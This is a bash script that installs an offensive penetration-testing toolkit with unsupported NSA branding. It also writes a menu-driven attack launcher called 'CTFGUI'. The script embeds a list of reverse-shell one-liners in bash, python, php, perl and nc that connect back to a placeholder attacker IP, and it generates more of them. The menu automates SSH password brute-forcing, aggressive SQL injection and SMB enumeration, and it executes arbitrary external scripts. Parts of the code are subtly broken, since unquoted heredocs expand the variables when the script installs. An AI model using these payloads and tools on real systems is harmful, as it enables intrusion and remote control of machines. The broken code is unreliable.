#!/bin/bash

# Fully Automated NSA Red Team Toolkit Installer + CTFGUI Offensive Automation Interface
# Purpose-built for National Security Agency (NSA) Red Team Offensive & Defensive Operations
# Enhanced with CTFGUI by Taylor Christian Newsome (ClumsyLulz)
# Compatible with Debian 12 (Bookworm) or hardened lab instances

set -euo pipefail

if [[ $EUID -ne 0 ]]; then
  echo -e "\033[1;31m[!] This script must be run as root.\033[0m"
  exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
echo -e "${GREEN}[*] Initializing NSA Red Team Toolkit Deployment...${NC}"

apt update && apt upgrade -y

apt install -y \
  git curl wget unzip python3 python3-pip ruby gcc make \
  nmap netcat telnet swaks dnsrecon amass arp-scan hping3 \
  whatweb gobuster ffuf nikto wpscan wfuzz xsstrike sqlmap nuclei \
  hydra onesixtyone snmpwalk enum4linux smbclient crackmapexec \
  impacket-scripts nbtscan rdesktop xfreerdp tcpdump build-essential \
  libpcap-dev libssl-dev libffi-dev python3-dev libxml2-dev libxslt1-dev \
  zlib1g-dev libjpeg-dev default-jdk ruby-dev tmux rlwrap jq \
  seclists wordlists

pip3 install --break-system-packages --no-input --quiet \
  ptyprocess requests lxml beautifulsoup4 flask flask-login flask-wtf \
  flask-sqlalchemy flask-migrate flask-bootstrap flask-mail flask-script \
  flask-bcrypt flask-cors flask-httpauth flask-jwt-extended flask-limiter \
  flask-marshmallow flask-restful flask-socketio flask-talisman flask-wtf \
  flask-caching flask-compress flask-debugtoolbar flask-excel flask-gravatar \
  flask-moment flask-nav flask-paginate flask-principal flask-seasurf \
  flask-security flask-socketio flask-sqlalchemy flask-uploads flask-user \
  flask-wtf flask-xml-rpc

gem install bundler --silent

mkdir -p /opt/redteam && cd /opt/redteam

[[ ! -d LinEnum ]] && git clone https://github.com/rebootuser/LinEnum.git
[[ ! -d PEASS-ng ]] && git clone https://github.com/carlospolop/PEASS-ng.git
[[ ! -d pspy ]] && git clone https://github.com/DominicBreuker/pspy.git

if [[ ! -d "/opt/metasploit-framework" ]]; then
  git clone https://github.com/rapid7/metasploit-framework.git /opt/metasploit-framework
  cd /opt/metasploit-framework && bundle install
fi

cat <<EOF >> /etc/profile.d/nsa_redteam.sh
export PATH=\$PATH:/opt/metasploit-framework
alias msf='/opt/metasploit-framework/msfconsole'
alias ctf_gui='/opt/metasploit-framework/msfconsole'
EOF

chmod +x /etc/profile.d/nsa_redteam.sh
source /etc/profile.d/nsa_redteam.sh

touch /opt/nsa_redteam_ops.txt

cat <<EOF > /opt/nsa_redteam_ops.txt

SMTP Testing:
  nc <IP> 25
  telnet <IP> 25
  swaks --to test@example.com --from from@example.com --server <IP> --data "Subject: test\n\nBody here"

Reverse Shell Payloads:
  bash -i >& /dev/tcp/<yourIP>/4444 0>&1
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<yourIP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
  php -r '$sock=fsockopen("<yourIP>",4444);exec("/bin/bash <&3 >&3 2>&3");'
  perl -e 'use Socket;$i="<yourIP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  nc -e /bin/sh <yourIP> 4444

Listener:
  nc -lvnp 4444

EOF

cat <<EOF > /usr/local/bin/ctfgui
#!/bin/bash

function generate_payload() {
    read -p "Enter your IP (LHOST): " lhost
    read -p "Enter your port (LPORT): " lport
    echo -e "${YELLOW}[*] Reverse shell payload:${NC}"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
}

function start_listener() {
    read -p "Enter port to listen on: " lport
    echo -e "${YELLOW}[*] Starting listener on port $lport...${NC}"
    nc -lvnp "$lport"
}

function auto_recon() {
    read -p "Enter target IP or URL: " target
    echo -e "${YELLOW}[*] Starting automated recon on $target...${NC}"
    nmap -sC -sV -Pn "$target" -oN nmap_scan.txt &
    whatweb "$target" > web_tech.txt &
    nuclei -u "$target" -t cves/ -severity critical,high,medium -o nuclei_report.txt &
    ffuf -u "$target"/FUZZ -w /usr/share/wordlists/dirb/common.txt -o ffuf.txt &
    wait
    echo -e "${GREEN}[+] Recon complete. Reports saved.${NC}"
}

function load_modules() {
    read -p "Enter path to custom module: " mod
    if [[ -f "$mod" ]]; then
        chmod +x "$mod"
        echo -e "${YELLOW}[*] Executing external module...${NC}"
        bash "$mod"
    else
        echo -e "${RED}[-] Module not found.${NC}"
    fi
}

function menu() {
    clear
    echo -e "${GREEN}CTFGUI - Offensive Automation Interface${NC}"
    echo -e "Made by Taylor Christian Newsome"
    echo "=================================================="
    echo "1) Full TCP Port Scan"
    echo "2) Web Directory Bruteforce (Gobuster)"
    echo "3) FFUF Web Fuzzing"
    echo "4) Nikto Vulnerability Scan"
    echo "5) SQLMap SQL Injection Test"
    echo "6) SSH Brute Force (Hydra)"
    echo "7) SMB Enumeration"
    echo "8) Nuclei CVE Scanner"
    echo "9) XSStrike XSS Scan"
    echo "10) Generate Reverse Shell Payload"
    echo "11) Enum4linux SMB Recon"
    echo "12) Web Tech Recon (WhatWeb)"
    echo "13) Wordlist Generator (Cewl)"
    echo "14) Start Netcat Listener"
    echo "15) Automated Recon Chain"
    echo "16) Load External Modules"
    echo "17) Exit"
    echo "=================================================="
    read -p "Choose an option: " opt

    case $opt in
        1) read -p "Target IP: " target; nmap -p- --min-rate=10000 -T4 -Pn "$target" ;;
        2) read -p "Target URL: " target; gobuster dir -u "$target" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 50 ;;
        3) read -p "Target URL: " target; ffuf -u "$target/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.bak,.txt -mc all ;;
        4) read -p "Target URL: " target; nikto -host "$target" ;;
        5) read -p "Target URL: " target; sqlmap -u "$target/index.php?id=1" --batch --random-agent --level=5 --risk=3 ;;
        6) read -p "Target IP: " target; hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://"$target" ;;
        7) read -p "Target IP: " target; smbclient -L \\$target -N; crackmapexec smb "$target" --shares ;;
        8) read -p "Target URL: " target; nuclei -u "$target" -t cves/ -severity critical,high,medium ;;
        9) read -p "Target URL: " target; xsstrike -u "$target/index.php?q=test" ;;
        10) generate_payload ;;
        11) read -p "Target IP: " target; enum4linux "$target" ;;
        12) read -p "Target URL: " target; whatweb "$target" ;;
        13) read -p "Target URL: " target; cewl "$target" -w custom_wordlist.txt ;;
        14) start_listener ;;
        15) auto_recon ;;
        16) load_modules ;;
        17) exit 0 ;;
        *) echo -e "${RED}Invalid option.${NC}" ;;
    esac
}

menu
EOF

chmod +x /usr/local/bin/ctfgui

ln -sf /usr/local/bin/ctfgui /usr/bin/ctfgui

echo -e "${GREEN}[+] Installation complete. Run 'ctfgui' to launch the interface.${NC}"
